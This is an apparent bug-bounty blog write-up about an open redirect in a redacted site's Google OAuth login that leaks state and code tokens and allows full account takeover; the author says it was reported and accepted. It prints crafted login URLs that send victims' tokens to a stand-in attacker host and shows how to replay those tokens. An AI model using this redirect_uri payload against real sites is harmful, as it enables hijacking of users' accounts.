---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-17_full-account-takeover-via-open-redirection.md
original_filename: 2022-04-17_full-account-takeover-via-open-redirection.md
title: Full Account Takeover via Open Redirection
category: documents
detected_topics:
- oauth
- sso
- command-injection
- otp
- api-security
tags:
- imported
- documents
- oauth
- sso
- command-injection
- otp
- api-security
language: en
raw_sha256: 1ea78f5f0f0ae19ecf589df61722c3bc2ad3fafd4d91ee64033cecfcc9c004dc
text_sha256: aaec69da1e0de3bcb3ca427dae9dc02a97835e91fa5270a56766f29c83776b11
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Full Account Takeover via Open Redirection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-17_full-account-takeover-via-open-redirection.md
- Source Type: markdown
- Detected Topics: oauth, sso, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `1ea78f5f0f0ae19ecf589df61722c3bc2ad3fafd4d91ee64033cecfcc9c004dc`
- Text SHA256: `aaec69da1e0de3bcb3ca427dae9dc02a97835e91fa5270a56766f29c83776b11`


## Content

---
title: "Full Account Takeover via Open Redirection"
url: "https://medium.com/@vflexo/full-account-takeover-via-open-redirection-41c167db46"
authors: ["vFlexo (@vflexo)"]
bugs: ["Open redirect", "Token leak", "Account takeover", "OAuth"]
publication_date: "2022-04-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2702
scraped_via: "browseros"
---

# Full Account Takeover via Open Redirection

Full Account Takeover via Open Redirection
Vishal Barot
Follow
3 min read
·
Apr 17, 2022

495

11

Hacking ! Hacking ! Hacking! I don’t like it. I avoid.

But Hacking likes me ! I can’t avoid.

Hello Guys! It’s Sunday so let me tell you a story.

The story of cruel exploitation of an Open Redirection vulnerability.

“Khoon se likhi hui kahani hai.
Syahi se nahi badhegi.
Agar aage badhana hai,
To fir se khoon hi mangegi.”

I found an open redirection vulnerability then I decided to check if I can exploit it further as I found this open redirection on Google O-auth.

I will not reveal the site name so I am going to call the site redacted.com.

The O-auth url was like this:

https://redacted.com/login?action=login&state=29f16a7e5c6f2b9970450b14a30f59d4&scope=&response_type=code&approval_prompt=auto&redirect_uri=https://app.redacted.com/auth/oauthCallback&client_id=4jivia3ebm9mbpcj22i2n29pdi

In the redirect_uri parameter, I injected https://tinder.com.

Like this:

https://redacted.com/login?action=login&state=29f16a7e5c6f2b9970450b14a30f59d4&scope=&response_type=code&approval_prompt=auto&redirect_uri=https://tinder.com/auth/oauthCallback&client_id=4jivia3ebm9mbpcj22i2n29pdi

Then I loaded this link and selected my google account from the browser to get logged in via Google but when the login process finished I was redirected to tinder.com.

Press enter or click to view image in full size

And also the state parameter and code parameter and their values also got sent to tinder.com. You can clearly see that in the screenshot above.

Now I again performed the same open redirection but this time I intercepted each request, observed it and then forwarded it. During this process I came across link like this:

Get Vishal Barot’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://app.redacted.com/auth/oauthCallback?state=afc167244e4216d28a652c4b3fb37651&code=7f7abb1ee5e44692884a20218ce798

I copied this link from the burp interception, pasted it in a different browser and BOOM.

I GOT LOGGED IN.

It confirms that the url https://app.redacted.com/auth/oauthCallback?state=afc167244e4216d28a652c4b3fb37651&code=7f7abb1ee5e44692884a20218ce798 have two tokens in the state and code parameter that gets the user logged in via Google SSO. These two tokens are obtained for a google account when the O-auth process is finished and the Google gives a green light in form of these tokens.

If one steals the token and add them into the url:

https://app.redacted.com/auth/oauthCallback?state=afc167244e4216d28a652c4b3fb37651&code=7f7abb1ee5e44692884a20218ce798 and opens the link, then he will get logged in to the account of the person these O-auth tokens belonged to.

Interesting, isn’t it?

Now I have already found a way to steal tokens:

Deliver the url to victim with attackersite in redirect_uri parameter

https://redacted.com/login?action=login&state=29f16a7e5c6f2b9970450b14a30f59d4&scope=&response_type=code&approval_prompt=auto&redirect_uri=https://attackersite.com/auth/oauthCallback&client_id=4jivia3ebm9mbpcj22i2n29pdi

2. When the victim sign-in with Google tokens will be received at attackersite.com that is controlled by the attacker.

Once the attacker have tokens of the victim, all he need to do is put those tokens(state parameter and code parameter value) in this url:

https://app.redacted.com/auth/oauthCallback?state=VALUE1&code=VALUE2

And then load this url, he will be logged in to the victim’s account making it a complete account takeover.

I have successfully reported this issue and it has been accepted. Waiting for the bounty.

If you enjoyed reading this write-up, do not forget to comment “Salaam Rocky-Bhai” in the comment section. :D

“Meri dosti layak koi yaar nahi, Meri dushmani jhel sake aisi koi talvar nahi”

-Rocky( Since 1951)
